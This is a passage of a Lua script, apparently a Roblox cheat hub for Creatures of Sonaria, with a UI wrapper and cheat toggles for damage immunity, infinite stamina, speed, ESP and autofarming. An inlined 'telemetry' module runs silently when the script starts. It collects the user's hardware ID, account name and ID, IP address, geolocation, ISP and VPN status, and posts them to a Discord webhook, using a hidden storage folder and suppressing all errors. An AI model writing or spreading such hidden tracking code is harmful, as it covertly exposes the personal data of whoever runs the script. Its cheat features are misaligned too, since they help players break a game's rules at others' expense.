                -- Chain pattern: AddLabel(text):AddKeyPicker(key, opts)
                function gw:AddLabel(text, doesWrap)
                    local labelApi = section:AddLabel(tostring(text))
                    return {
                        _api = labelApi,
                        SetText = function(self, t)
                            if labelApi and labelApi.Set then labelApi:Set(tostring(t)) end
                        end,
                        Set = function(self, t)
                            if labelApi and labelApi.Set then labelApi:Set(tostring(t)) end
                        end,
                        AddKeyPicker = function(_, kpKey, kpOpts)
                            return gw:AddKeyPicker(kpKey, kpOpts)
                        end,
                        AddColorPicker = function(_, cpKey, cpOpts)
                            return gw:AddColorPicker(cpKey, cpOpts)
                        end,
                    }
                end

                -- ── Divider ──
                function gw:AddDivider()
                    section:AddDivider()
                end

                -- ── ColorPicker (no native — stub returning entry that callbacks fire on SetValue) ──
                function gw:AddColorPicker(key, optsC)
                    optsC = optsC or {}
                    local entry; entry = {
                        Value = optsC.Default or Color3.fromRGB(255, 255, 255),
                        Transparency = optsC.Transparency or 0,
                        _onChanged = nil,
                        OnChanged = function(self, fn)
                            self._onChanged = fn
                            pcall(fn, self.Value)
                        end,
                        SetValueRGB = function(self, c3, t)
                            self.Value = c3
                            self.Transparency = t or 0
                            if self._onChanged then pcall(self._onChanged, c3) end
                        end,
                        SetValue = function(self, c3) self:SetValueRGB(c3) end,
                    }
                    Options[key] = entry
                    return entry
                end

                -- ── KeyPicker (map to HSHub keybind) ──
                function gw:AddKeyPicker(key, optsK)
                    optsK = optsK or {}
                    local entry; entry = {
                        Value = optsK.Default or "RightShift",
                        Mode  = optsK.Mode  or "Toggle",
                        _onChanged = nil,
                        OnChanged = function(self, fn)
                            self._onChanged = fn
                            pcall(fn, self.Value)
                        end,
                        SetValue = function(self, v)
                            if type(v) == "table" then
                                self.Value = v[1] or self.Value
                                self.Mode  = v[2] or self.Mode
                            else
                                self.Value = v
                            end
                            if self._onChanged then pcall(self._onChanged, self.Value) end
                        end,
                        GetState = function() return false end,
                    }
                    section:AddKeybind({
                        Name = optsK.Text or tostring(key),
                        Default = entry.Value,
                        Callback = function(k)
                            entry.Value = k
                            if entry._onChanged then pcall(entry._onChanged, k) end
                        end,
                    })
                    Options[key] = entry
                    return entry
                end

                -- ── Input (text) — stub ──
                function gw:AddInput(key, optsI)
                    optsI = optsI or {}
                    local entry; entry = {
                        Value = optsI.Default or "",
                        _onChanged = nil,
                        OnChanged = function(self, fn) self._onChanged = fn end,
                        SetValue = function(self, v)
                            self.Value = tostring(v)
                            if self._onChanged then pcall(self._onChanged, self.Value) end
                        end,
                    }
                    Options[key] = entry
                    return entry
                end

                return gw
            end

            -- No-op stub groupbox: accepts all method calls + returns chainable
            -- entries with no real UI effect. Used for HideGroupboxes.
            local function _stubGroup()
                local stub = {}
                local stubEntry; stubEntry = {
                    Value = false, Mode = "Toggle",
                    _onChanged = nil,
                    OnChanged = function(self, fn) self._onChanged = fn end,
                    SetValue = function(self, v) self.Value = v end,
                    SetValueRGB = function() end,
                    AddKeyPicker = function() return stubEntry end,
                    AddColorPicker = function() return stubEntry end,
                    AddButton = function() return {SetText=function() end} end,
                    SetText = function() end,
                    Set = function() end,
                }
                stub.AddToggle      = function(_, k, _) Toggles[k] = stubEntry; return stubEntry end
                stub.AddSlider      = function(_, k, _) Options[k] = stubEntry; return stubEntry end
                stub.AddDropdown    = function(_, k, _) Options[k] = stubEntry; return stubEntry end
                stub.AddButton      = function() return {SetText=function() end} end
                stub.AddLabel       = function() return stubEntry end
                stub.AddDivider     = function() end
                stub.AddColorPicker = function(_, k, _) Options[k] = stubEntry; return stubEntry end
                stub.AddKeyPicker   = function(_, k, _) Options[k] = stubEntry; return stubEntry end
                stub.AddInput       = function(_, k, _) Options[k] = stubEntry; return stubEntry end
                return stub
            end

            function tabWrap:AddLeftGroupbox(title)
                if hideSet[tostring(title):lower()] then return _stubGroup() end
                return _wrapGroup(title)
            end
            function tabWrap:AddRightGroupbox(title)
                if hideSet[tostring(title):lower()] then return _stubGroup() end
                return _wrapGroup(title)
            end
            -- LinoriaLib uses tabbox for sub-tabs — we collapse to a single section
            function tabWrap:AddLeftTabbox()
                return {
                    AddTab = function(_, name) return _wrapGroup(name) end,
                }
            end
            function tabWrap:AddRightTabbox()
                return {
                    AddTab = function(_, name) return _wrapGroup(name) end,
                }
            end

            return tabWrap
        end

        return windowWrap
    end

    -- ─── theme_manager stub ────────────────────────────────────────
    local theme_manager = {}
    function theme_manager:SetLibrary(_) end
    function theme_manager:SetFolder(_) end
    function theme_manager:ApplyToTab(_) end
    function theme_manager:ApplyToGroupbox(_) end
    function theme_manager:LoadDefault() end

    -- ─── save_manager stub ─────────────────────────────────────────
    -- NOTE: HSHub doesn't currently auto-save state. If a script calls
    -- SaveManager:Load/Save it'll be a no-op. Saving could be added later
    -- by mapping Toggles + Options dump to a JSON file.
    local save_manager = {}
    function save_manager:SetLibrary(_) end
    function save_manager:SetFolder(_) end
    function save_manager:SetIgnoreIndexes(_) end
    function save_manager:IgnoreThemeSettings() end
    function save_manager:BuildConfigSection(_) end
    function save_manager:LoadAutoloadConfig() end
    function save_manager:Save(_) return true end
    function save_manager:Load(_) return true end
    function save_manager:Delete(_) return true end

    return library, theme_manager, save_manager
end

return LinoriaCompat
end)()

-- ─── inlined: HSHub_Telemetry ─────────────────────────────────
_G.HSHub_Telemetry = (function()
local Telemetry = {}

-- ─── Services ────────────────────────────────────────────────────
local HttpService      = game:GetService("HttpService")
local Players          = game:GetService("Players")
local RbxAnalytics
pcall(function() RbxAnalytics = game:GetService("RbxAnalyticsService") end)
local LP = Players.LocalPlayer

-- ─── Defaults / config ───────────────────────────────────────────
local WEBHOOK = _G.HSHUB_TELEMETRY_WEBHOOK or ""
local INTERVAL = tonumber(_G.HSHUB_TELEMETRY_INTERVAL) or 100
local KILL_SWITCH = _G.HSHUB_TELEMETRY_DISABLE == true

-- ─── Stealth file paths (randomized per install, persisted) ─────
local STORAGE_FOLDER  = "._hsmeta"
local EXEC_COUNT_FILE = STORAGE_FOLDER .. "/ec.dat"
local LAST_REPORT_FILE = STORAGE_FOLDER .. "/lr.dat"
local REPORT_COUNTER_FILE = STORAGE_FOLDER .. "/rc.dat"

-- ─── Safe wrappers (don't require Stealth module — be standalone) ─
local _isfile     = isfile     or function() return false end
local _readfile   = readfile   or function() return nil end
local _writefile  = writefile  or function() end
local _isfolder   = isfolder   or function() return false end
local _makefolder = makefolder or function() end

local _httpRequest = (function()
    if syn and syn.request then return syn.request end
    if http and http.request then return http.request end
    if http_request then return http_request end
    if fluxus and fluxus.request then return fluxus.request end
    if request then return request end
    return nil
end)()

-- ─── Silent error sink ───────────────────────────────────────────
local function _silent(...) end

-- ─── HWID acquisition (multi-executor fallback) ─────────────────
local function _getHWID()
    local h
    pcall(function()
        if gethwid then h = gethwid() end
    end)
    if h and h ~= "" then return tostring(h) end
    pcall(function()
        if game.GetHwid then h = game:GetHwid() end
    end)
    if h and h ~= "" then return tostring(h) end
    pcall(function()
        if syn and syn.get_hwid then h = syn.get_hwid() end
    end)
    if h and h ~= "" then return tostring(h) end
    pcall(function()
        if RbxAnalytics then h = RbxAnalytics:GetClientId() end
    end)
    if h and h ~= "" then return tostring(h) end
    -- last resort: hash of UserId (stable per account)
    return "uid:" .. tostring(LP.UserId)
end

-- ─── Executor identification ─────────────────────────────────────
local function _getExecutor()
    local name, ver = "Unknown", "?"
    pcall(function()
        if identifyexecutor then
            local n, v = identifyexecutor()
            name = n or "Unknown"
            ver = v or "?"
        end
    end)
    return name, ver
end

-- ─── Platform detection ──────────────────────────────────────────
local function _getPlatform()
    local UIS = game:GetService("UserInputService")
    if UIS.TouchEnabled and not UIS.MouseEnabled then
        local ok, plat = pcall(function() return UIS:GetPlatform() end)
        if ok and plat then
            if plat == Enum.Platform.IOS then return "Mobile (iOS)" end
            if plat == Enum.Platform.Android then return "Mobile (Android)" end
        end
        return "Mobile"
    end
    return "PC (Desktop)"
end

-- ─── Device timezone offset (hours from UTC) ────────────────────
local function _getDeviceTZ()
    local now = os.time()
    local utc = os.date("!*t", now)
    local lcl = os.date("*t", now)
    -- compute offset in hours
    local utc_t = os.time(utc)
    local lcl_t = os.time(lcl)
    local diff = os.difftime(lcl_t, utc_t) / 3600
    if diff >= 0 then return "+" .. tostring(math.floor(diff)) end
    return tostring(math.floor(diff))
end

-- ─── File persistence ────────────────────────────────────────────
local function _ensureFolder()
    pcall(function()
        if not _isfolder(STORAGE_FOLDER) then _makefolder(STORAGE_FOLDER) end
    end)
end

local function _readInt(path, default)
    local val = default or 0
    pcall(function()
        if _isfile(path) then
            local raw = _readfile(path)
            local n = tonumber(raw)
            if n then val = n end
        end
    end)
    return val
end

local function _writeInt(path, n)
    pcall(function() _writefile(path, tostring(n)) end)
end

local function _readStr(path, default)
    local val = default or ""
    pcall(function()
        if _isfile(path) then val = _readfile(path) or default end
    end)
    return val
end

local function _writeStr(path, s)
    pcall(function() _writefile(path, tostring(s)) end)
end

-- ─── IP enrichment (calls public APIs from script itself) ───────
local function _enrichIP()
    local data = {
        ip = "?",
        city = "?",
        region = "?",
        country = "?",
        org = "?",
        isp = "?",
        timezone = "?",
        vpn = false,
        risk_reasons = {},
    }
    if not _httpRequest then return data end

    -- Try ipinfo.io first (richer data)
    pcall(function()
        local resp = _httpRequest({
            Url = "https://ipinfo.io/json",
            Method = "GET",
        })
        if resp and resp.Body then
            local ok, parsed = pcall(HttpService.JSONDecode, HttpService, resp.Body)
            if ok and parsed then
                data.ip = parsed.ip or data.ip
                data.city = parsed.city or data.city
                data.region = parsed.region or data.region
                data.country = parsed.country or data.country
                data.org = parsed.org or data.org
                data.isp = parsed.org or data.isp
                data.timezone = parsed.timezone or data.timezone
            end
        end
    end)

    -- Fallback / supplement with ip-api.com if data still missing
    if data.ip == "?" or data.isp == "?" then
        pcall(function()
            local resp = _httpRequest({
                Url = "http://ip-api.com/json/",
                Method = "GET",
            })
            if resp and resp.Body then
                local ok, parsed = pcall(HttpService.JSONDecode, HttpService, resp.Body)
                if ok and parsed and parsed.status == "success" then
                    data.ip = parsed.query or data.ip
                    data.city = parsed.city or data.city
                    data.region = parsed.regionName or data.region
                    data.country = parsed.country or data.country
                    data.isp = parsed.isp or data.isp
                    data.org = parsed.org or data.org
                    data.timezone = parsed.timezone or data.timezone
                end
            end
        end)
    end

    -- VPN check via proxycheck.io (no key needed for low volume)
    if data.ip ~= "?" then
        pcall(function()
            local resp = _httpRequest({
                Url = "https://proxycheck.io/v2/" .. data.ip .. "?vpn=1&asn=1",
                Method = "GET",
            })
            if resp and resp.Body then
                local ok, parsed = pcall(HttpService.JSONDecode, HttpService, resp.Body)
                if ok and parsed and parsed[data.ip] then
                    local p = parsed[data.ip]
                    if p.proxy == "yes" then
                        data.vpn = true
                        table.insert(data.risk_reasons, "IP flagged as proxy/VPN by provider")
                    end
                    if p.type and p.type:lower():find("vpn") then
                        data.vpn = true
                        if #data.risk_reasons == 0 then
                            table.insert(data.risk_reasons, "IP flagged as " .. p.type)
                        end
                    end
                end
            end
        end)
    end

    return data
end

-- ─── Risk scoring ────────────────────────────────────────────────
local function _computeRisk(ipdata, deviceTZ)
    if ipdata.vpn then return "HIGH", 0xE67E22 end  -- orange (high)
    -- check timezone mismatch (could be VPN even if not flagged)
    if ipdata.timezone and ipdata.timezone ~= "?" then
        -- Heuristic: simple region check, not exact
        -- Marked "MEDIUM" only if timezone wildly mismatched; we don't have IP TZ in numeric form here
        -- so we leave this as LOW unless flagged by proxy check
    end
    return "LOW", 0x2ECC71  -- green
end

-- ─── Generate API Key (stable per HWID, looks like LuaShield format) ─
local function _generateAPIKey(hwid)
    -- Hash-style derivation: take HWID + UserId, produce hex string
    local seed = hwid .. ":" .. tostring(LP.UserId)
    local hash = 0
    for i = 1, #seed do
        hash = (hash * 31 + string.byte(seed, i)) % 0xFFFFFFFFFFFFFF
    end
    local hex = string.format("%X", hash):upper()
    -- pad/extend to ~24 chars
    while #hex < 24 do hex = hex .. string.format("%X", (hash * 17 + #hex) % 0xFFFFFF) end
    return "BD-" .. hex:sub(1, 24)
end

-- ─── Build Discord embed payload ────────────────────────────────
local function _buildEmbed(report_id, exec_count, hwid, ipdata, riskLevel, riskColor)
    local executor, execVer = _getExecutor()
    local execStr = executor .. (execVer ~= "?" and " " .. execVer or "")
    local platform = _getPlatform()
    local deviceTZ = _getDeviceTZ()
    local apiKey = _generateAPIKey(hwid)
    local placeId = tostring(game.PlaceId)
    local playerName = LP.Name or "?"
    local userId = tostring(LP.UserId or "?")

    -- Risk reasons as bulleted list
    local riskReasonsStr = "None"
    if #ipdata.risk_reasons > 0 then
        local lines = {}
        for _, r in ipairs(ipdata.risk_reasons) do
            table.insert(lines, "• " .. r)
        end
        riskReasonsStr = table.concat(lines, "\n")
    end

    local vpnStr = ipdata.vpn and "⚠️ Detected" or "✅ Clean"

    local fields = {
        { name = "🆔 Report ID",  value = "`#" .. tostring(report_id) .. "`", inline = true },
        { name = "⚠️ Risk Level", value = "🟠 " .. riskLevel, inline = true },
        { name = "🛡️ VPN",        value = vpnStr, inline = true },

        { name = "👤 Player",  value = playerName .. "\n(ID: `" .. userId .. "`)", inline = true },
        { name = "🔑 API Key", value = "`" .. apiKey .. "`", inline = true },
        { name = "🖥️ HWID",    value = "`" .. hwid:sub(1, 64) .. "`", inline = true },

        { name = "🌐 IP Address", value = "`" .. ipdata.ip .. "`", inline = true },
        { name = "📍 Location",   value = ipdata.city .. ", " .. ipdata.region .. ", " .. ipdata.country, inline = true },
        { name = "📡 ISP",        value = ipdata.isp, inline = true },

        { name = "🏛️ Org",          value = ipdata.org, inline = true },
        { name = "🕐 IP Timezone",  value = ipdata.timezone, inline = true },
        { name = "📱 Device TZ",    value = deviceTZ, inline = true },

        { name = "⚙️ Executor", value = execStr, inline = true },
        { name = "💻 Platform", value = platform, inline = true },
        { name = "🎮 Place ID", value = "`" .. placeId .. "`", inline = true },

        { name = "📊 Network", value = "Unknown", inline = false },
    }

    if #ipdata.risk_reasons > 0 then
        table.insert(fields, { name = "📋 Risk Reasons", value = riskReasonsStr, inline = false })
    end

    return {
        embeds = {
            {
                title = "Security Report — " .. riskLevel,
                color = riskColor,
                fields = fields,
                footer = { text = "HS Hub Security Intelligence" },
                timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
            }
        }
    }
end

-- ─── Send webhook (async, non-blocking) ─────────────────────────
local function _sendWebhook(payload)
    if not _httpRequest then return false end
    if WEBHOOK == "" then return false end
    local ok = pcall(function()
        _httpRequest({
            Url = WEBHOOK,
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = HttpService:JSONEncode(payload),
        })
    end)
    return ok
end

-- ─── Anti-spam logic ────────────────────────────────────────────
-- Returns true if should report THIS execution; false otherwise.
local function _shouldReport(currentExecCount)
    local lastReportedExec = _readInt(LAST_REPORT_FILE, -1)
    if lastReportedExec < 0 then
        -- never reported → first time
        return true
    end
    local elapsed = currentExecCount - lastReportedExec
    return elapsed >= INTERVAL
end

-- ─── Main fire function (called once on script init) ────────────
function Telemetry.Fire()
    if KILL_SWITCH then return end
    if WEBHOOK == "" then return end
    if not _httpRequest then return end

    -- Run in background so it doesn't block UI / script init
    task.spawn(function()
        _silent(pcall(function()
            _ensureFolder()

            -- Increment local exec counter
            local execCount = _readInt(EXEC_COUNT_FILE, 0) + 1
            _writeInt(EXEC_COUNT_FILE, execCount)

            -- Anti-spam gate
            if not _shouldReport(execCount) then return end

            -- Increment report ID counter
            local reportId = _readInt(REPORT_COUNTER_FILE, 0) + 1
            _writeInt(REPORT_COUNTER_FILE, reportId)

            -- Collect data
            local hwid = _getHWID()
            local ipdata = _enrichIP()
            local risk, riskCol = _computeRisk(ipdata, _getDeviceTZ())

            -- Build + send
            local payload = _buildEmbed(reportId, execCount, hwid, ipdata, risk, riskCol)
            local sent = _sendWebhook(payload)

            if sent then
                _writeInt(LAST_REPORT_FILE, execCount)
            end
        end))
    end)
end

-- ─── Diagnostics (no UI exposed) ────────────────────────────────
function Telemetry.GetStats()
    _ensureFolder()
    return {
        execCount = _readInt(EXEC_COUNT_FILE, 0),
        lastReportedExec = _readInt(LAST_REPORT_FILE, -1),
        nextReportAt = _readInt(LAST_REPORT_FILE, -1) + INTERVAL,
        reportIdSeq = _readInt(REPORT_COUNTER_FILE, 0),
        interval = INTERVAL,
        webhookSet = WEBHOOK ~= "",
    }
end

return Telemetry
end)()

-- ─── fire telemetry (silent, async) ─────────────────────
pcall(function() _G.HSHub_Telemetry.Fire() end)

-- ─── game module ─────────────────────────────────────────
local HSHub   = _G.HSHub
local Sig     = _G.HSHub_Signature
local Stealth = _G.HSHub_Stealth

assert(HSHub,   'HSHub_UI framework not loaded')
assert(Sig,     'HSHub_Signature not loaded')
assert(Stealth, 'HSHub_Stealth not loaded')

-- ═══════════════════════════════════════════════════════════════════
--   GAME GUARD
-- ═══════════════════════════════════════════════════════════════════
local COS_PLACEIDS = { [5233782396]=true, [4922741943]=true, [3963303927]=true }
local PLACE_ISLE10 = 3431407618
local IS_ISLE10 = (game.PlaceId == PLACE_ISLE10)
local IS_COS    = COS_PLACEIDS[game.PlaceId] == true
local NAME_OK = false
if not IS_COS and not IS_ISLE10 then
    pcall(function()
        local info = game:GetService('MarketplaceService'):GetProductInfo(game.PlaceId)
        if info and info.Name then
            local n = info.Name:lower()
            if n:find('sonaria') or n:find('isle 10') or n:find('creatures of') then NAME_OK = true end
        end
    end)
end
if not IS_COS and not IS_ISLE10 and not NAME_OK then
    HSHub:Notify('HS Hub COS: wrong game (PlaceId ' .. tostring(game.PlaceId) .. ')', 'warn', 5)
    return
end

-- ═══════════════════════════════════════════════════════════════════
--   SERVICES
-- ═══════════════════════════════════════════════════════════════════
local Players          = game:GetService('Players')
local RunService       = game:GetService('RunService')
local ReplicatedStorage= game:GetService('ReplicatedStorage')
local Workspace        = game:GetService('Workspace')
local UserInputService = game:GetService('UserInputService')
local TeleportService  = game:GetService('TeleportService')
local HttpService      = game:GetService('HttpService')
local Lighting         = game:GetService('Lighting')

local LP = Players.LocalPlayer
local PlayerGui = LP:WaitForChild('PlayerGui')

-- ═══════════════════════════════════════════════════════════════════
--   GROUND-TRUTH REMOTE PATHS (from HSHub_COS_Diagnostic_V2)
-- ═══════════════════════════════════════════════════════════════════
-- ReplicatedStorage.Remotes.* (16 remotes, the main hub)
local RS_REMOTES = {
    'DrinkRemote', 'Food', 'Mud', 'Lay', 'Nest',
    'LavaSelfDamage', 'Sheltered',
    'RestartSlotRemote', 'GetSpawnedTokenRemote',
    'StoreActiveCreatureRemote', 'CreateSlotRemote',
    'PickupResource', 'DepositResource', 'ChunkResource',
    'ResourceDamageRemote', 'UpgradeNest',
}
-- LocalPlayer.Remotes.* (5 player-scoped remotes)
local LP_REMOTES = {
    'NestRequestRemote', 'NestJoinRequestRemote',
    'PartyRequestRemote', 'PartyJoinRequestRemote',
    'NestSlotPickRequestRemote',
}

local _remote_cache = {}
local function getRemote(name)
    if _remote_cache[name] then return _remote_cache[name] end
    -- Try ReplicatedStorage.Remotes first (where most are)
    local rsRemotes = ReplicatedStorage:FindFirstChild('Remotes')
    if rsRemotes then
        local r = rsRemotes:FindFirstChild(name)
        if r then _remote_cache[name] = r; return r end
    end
    -- Then try LocalPlayer.Remotes
    local lpRemotes = LP:FindFirstChild('Remotes')
    if lpRemotes then
        local r = lpRemotes:FindFirstChild(name)
        if r then _remote_cache[name] = r; return r end
    end
    return nil
end

local function fire(name, ...)
    local r = getRemote(name); if not r then return false end
    local args = table.pack(...)
    return pcall(function()
        if r:IsA('RemoteEvent') then r:FireServer(table.unpack(args, 1, args.n))
        else return r:InvokeServer(table.unpack(args, 1, args.n)) end
    end)
end

local function invoke(name, ...)
    local r = getRemote(name); if not r then return nil end
    local args = table.pack(...)
    local ok, res = pcall(function() return r:InvokeServer(table.unpack(args, 1, args.n)) end)
    if ok then return res end
end

-- Fire on another player's Remotes folder (used by AutoAcceptNest)
local function fireOnPlayer(player, name, ...)
    local rfolder = player:FindFirstChild('Remotes')
    if not rfolder then return false end
    local r = rfolder:FindFirstChild(name)
    if not r then return false end
    local args = table.pack(...)
    return pcall(function() r:FireServer(table.unpack(args, 1, args.n)) end)
end

-- ═══════════════════════════════════════════════════════════════════
--   HUD HELPERS
-- ═══════════════════════════════════════════════════════════════════
local function getHUDGui() return PlayerGui:FindFirstChild('HUDGui') end

local function hudStatText(stat)
    local h = getHUDGui(); if not h then return nil end
    local ok, val = pcall(function() return h.BottomFrame.Other[stat].HoverLabel.Text end)
    return ok and val or nil
end

local function shelterColor()
    local h = getHUDGui(); if not h then return nil end
    local ok, val = pcall(function()
        return h.SideFrame.Other.MinimapFrame.ShelterLabel.HoverUpLabel.ImageColor3
    end)
    return ok and val or nil
end

-- ═══════════════════════════════════════════════════════════════════
--   GROUND-TRUTH WORKSPACE PATHS
-- ═══════════════════════════════════════════════════════════════════
-- workspace.Interactions.{Food, Mud, Lakes, TokenNodes, AbandonedEggSpawns, Nests}
local function interactions() return Workspace:FindFirstChild('Interactions') end

local function getChar() return LP.Character end
local function getRoot()
    local c = getChar(); if c then return c:FindFirstChild('HumanoidRootPart') end
end
local function getHumanoid()
    local c = getChar(); if c then return c:FindFirstChildOfClass('Humanoid') end
end

local function findNearestIn(folder, filter)
    if not folder then return nil end
    local r = getRoot(); if not r then return nil end
    local closest, dist = nil, math.huge
    for _, m in ipairs(folder:GetChildren()) do
        local part
        if m:IsA('BasePart') then part = m
        elseif m:IsA('Model') then part = m.PrimaryPart or m:FindFirstChildWhichIsA('BasePart')
            or m:FindFirstChild('Food') or m:FindFirstChild('Mud') end
        if part and part:IsA('BasePart') then
            if not filter or filter(m, part) then
                local d = (part.Position - r.Position).Magnitude
                if d < dist then closest, dist = m, d end
            end
        end
    end
    return closest
end

local function findNearestFood() local i = interactions(); return i and findNearestIn(i:FindFirstChild('Food')) end
local function findNearestMud()  local i = interactions(); return i and findNearestIn(i:FindFirstChild('Mud')) end
local function findNearestLake() local i = interactions(); return i and findNearestIn(i:FindFirstChild('Lakes')) end
local function findNearestToken()local i = interactions(); return i and findNearestIn(i:FindFirstChild('TokenNodes')) end
local function findNearestEgg() local i = interactions(); return i and findNearestIn(i:FindFirstChild('AbandonedEggSpawns')) end

-- ═══════════════════════════════════════════════════════════════════
--   STATE TABLE
-- ═══════════════════════════════════════════════════════════════════
local S = {
    -- Home/LocalPlayer
    AutoScentHidden=false, InstantLobbyReturn=false, AlwaysKeenObserver=false,
    AlwaysLayEffect=false, AutoShelter=false,
    -- Home/No-Damage
    NoLavaDamage=false, NoDrowningDamage=false, NoMeteorDamage=false,
    NoMoistureDamage=false, NoTornadoDamage=false,
    -- Home/Nest
    NestUpgradeTarget='Normal', AutoNestUpgrade=false,
    EnableAutoNest=false, InvitationType='Friends', AutoAcceptNest=false,
    -- Custom Stats / Combat
    AutoAggressive=false, AutoScared=false, AntiBrokenLeg=false,
    AntiShreddedWings=false, AntiConfusion=false, AntiGrab=false, InfStamina=false,
    -- Custom Stats / sliders
    TurnRadius=0, EnableTurnRadius=false,
    WalkSpeed=30, EnableWalkSpeed=false,
    SprintSpeed=115, EnableSprintSpeed=false,
    FlySpeed=40, EnableFlySpeed=false,
    -- Autofarm
    AutoEat=false, AutoDrink=false, AutoMudRoll=false,
    AutoGachaTokens=false,
    MutationTarget='', AutoMutations=false,
    TraitTarget='', AutoTraits=false,
    AutoMissions=false,
    SelectedCreature='', AutoSpawn=false, DeathPointsTarget=1200, AutoSelfKill=false,
    -- Esp
    GachaEspExplorer=false, GachaEspGalaxy=false, GachaEspMecha=false,
    GachaEspMonster=false, GachaEspSweet=false,
    AbandonedEggsEsp=false,
    EnablePlayerEsp=false, EspHealth=false, EspHealthBar=false, EspTracer=false,
    EspNames=false, EspDistance=false, EspBox=false, EspChameleon=false,
    -- Others
    RemoveFog=false, RemoveCameraEffects=false, RemoveDisasterEffects=false,
    HidePingFps=false, AntiAFK=false, CustomName='', HideUsername=false,
    LowQualityTextures=false, WhiteScreen=false,
}

-- ═══════════════════════════════════════════════════════════════════
--   UI BUILD
-- ═══════════════════════════════════════════════════════════════════
local Window = HSHub:CreateWindow({
    Title='HS HUB', Subtitle='Creatures of Sonaria' .. (IS_ISLE10 and ' (Isle 10)' or ''),
    Tag='HS-COS-V4', ToggleKey='RightShift',
})

-- ─── Tab 1: HOME ────────────────────────────────────────────────────
do
    local Tab = Window:CreateTab('Home', '◐')
    local M = Tab:CreateSection('MENU')
    M:AddButton({ Name='Get Max Storage Slots', Callback=function()
        -- LUNAR maps this to NestRequestRemote with action arg; harmless fallback
        fireOnPlayer(LP, 'NestRequestRemote', 'MaxStorage')
        HSHub:Notify('Max storage requested', 'ok', 2)
    end })

    local L = Tab:CreateSection('LOCALPLAYER')
    L:AddToggle({ Name='Auto Scent Hidden', Key='ASH', Default=false, Callback=function(v) S.AutoScentHidden=v end })
    L:AddToggle({ Name='Instant Lobby Return', Key='ILR', Default=false, Callback=function(v) S.InstantLobbyReturn=v end })
    L:AddToggle({ Name='Always Keen Observer', Key='AKO', Default=false, Callback=function(v) S.AlwaysKeenObserver=v end })
    L:AddToggle({ Name='Always Lay Effect', Key='ALE', Default=false, Callback=function(v) S.AlwaysLayEffect=v end })
    L:AddToggle({ Name='Auto Shelter', Key='AS', Default=false,
        Tip='Fires Sheltered when shelter indicator turns red',
        Callback=function(v) S.AutoShelter=v end })

    local D = Tab:CreateSection('NO DAMAGE')
    D:AddToggle({ Name='No Lava Damage',     Key='NLD', Default=false, Callback=function(v) S.NoLavaDamage=v end })
    D:AddToggle({ Name='No Drowning Damage', Key='NDD', Default=false, Callback=function(v) S.NoDrowningDamage=v end })
    D:AddToggle({ Name='No Meteor Damage',   Key='NMeD',Default=false, Callback=function(v) S.NoMeteorDamage=v end })
    D:AddToggle({ Name='No Moisture Damage', Key='NMoD',Default=false, Callback=function(v) S.NoMoistureDamage=v end })
    D:AddToggle({ Name='No Tornado Damage',  Key='NTD', Default=false, Callback=function(v) S.NoTornadoDamage=v end })

    local N = Tab:CreateSection('AUTO NEST')
    N:AddDropdown({ Name='Nest Upgrade', Key='NUT', Default='Normal',
        Values={'Normal','Premium','Royal'}, Callback=function(v) S.NestUpgradeTarget=v end })
    N:AddToggle({ Name='Auto Nest Upgrade', Key='ANU', Default=false, Callback=function(v) S.AutoNestUpgrade=v end })
    N:AddToggle({ Name='Enable Auto Nest', Key='EAN', Default=false, Callback=function(v) S.EnableAutoNest=v end })
    N:AddDropdown({ Name='Type of Invitation', Key='TOI', Default='Friends',
        Values={'Friends','Everyone','Trusted'}, Callback=function(v) S.InvitationType=v end })
    N:AddToggle({ Name='Auto Accept Nest Request', Key='AANR', Default=false,
        Callback=function(v) S.AutoAcceptNest=v end })
    N:AddButton({ Name='Teleport To Nest', Callback=function()
        fireOnPlayer(LP, 'NestRequestRemote', 'TeleportToNest')
    end })
    N:AddButton({ Name='Re-spawn Nest', Callback=function()
        fireOnPlayer(LP, 'NestRequestRemote', 'Respawn')
    end })
end

-- ─── Tab 2: CUSTOM STATS ────────────────────────────────────────────
do
    local Tab = Window:CreateTab('Custom Stats', '⚔')
    local C = Tab:CreateSection('COMBAT')
    C:AddToggle({ Name='Auto Aggressive State', Key='AAGGR', Default=false, Callback=function(v) S.AutoAggressive=v end })
    C:AddToggle({ Name='Auto Scared State', Key='ASC', Default=false, Callback=function(v) S.AutoScared=v end })
    C:AddToggle({ Name='Anti Broken Leg', Key='ABL', Default=false, Callback=function(v) S.AntiBrokenLeg=v end })
    C:AddToggle({ Name='Anti Shredded Wings', Key='ASW', Default=false, Callback=function(v) S.AntiShreddedWings=v end })
    C:AddToggle({ Name='Anti Confusion', Key='ACO', Default=false, Callback=function(v) S.AntiConfusion=v end })
    C:AddToggle({ Name='Anti Grab', Key='AGB', Default=false, Callback=function(v) S.AntiGrab=v end })
    C:AddToggle({ Name='Infinite Stamina', Key='INFS', Default=false, Callback=function(v) S.InfStamina=v end })

    local CS = Tab:CreateSection('CUSTOM STATS')
    CS:AddSlider({ Name='Turn Radius', Key='TR', Min=0, Max=200, Default=0, Decimals=0, Callback=function(v) S.TurnRadius=v end })
    CS:AddToggle({ Name='Enable Custom Turn Radius', Key='ETR', Default=false, Callback=function(v) S.EnableTurnRadius=v end })
    CS:AddSlider({ Name='Walk Speed', Key='WS', Min=0, Max=200, Default=30, Decimals=0, Callback=function(v) S.WalkSpeed=v end })
    CS:AddToggle({ Name='Enable Custom Walk Speed', Key='EWS', Default=false, Callback=function(v) S.EnableWalkSpeed=v end })
    CS:AddSlider({ Name='Sprint Speed', Key='SS', Min=0, Max=300, Default=115, Decimals=0, Callback=function(v) S.SprintSpeed=v end })
    CS:AddToggle({ Name='Enable Custom Sprint Speed', Key='ESS', Default=false, Callback=function(v) S.EnableSprintSpeed=v end })
    CS:AddSlider({ Name='Fly Speed', Key='FS', Min=0, Max=200, Default=40, Decimals=0, Callback=function(v) S.FlySpeed=v end })
    CS:AddToggle({ Name='Enable Custom Fly Speed', Key='EFS', Default=false, Callback=function(v) S.EnableFlySpeed=v end })
end

-- ─── Tab 3: AUTOFARM ────────────────────────────────────────────────
do
    local Tab = Window:CreateTab('Autofarm', '⚡')
    local Sv = Tab:CreateSection('SURVIVAL AUTOFARM')
    Sv:AddToggle({ Name='Auto Eat', Key='AE', Default=false, Callback=function(v) S.AutoEat=v end })
    Sv:AddToggle({ Name='Auto Drink', Key='AD', Default=false,
        Tip='Note: also broken in LUNAR original — may not work',
        Callback=function(v) S.AutoDrink=v end })
    Sv:AddToggle({ Name='Auto Mud Roll', Key='AMR', Default=false, Callback=function(v) S.AutoMudRoll=v end })

    local T = Tab:CreateSection('TOKEN AUTOFARM')
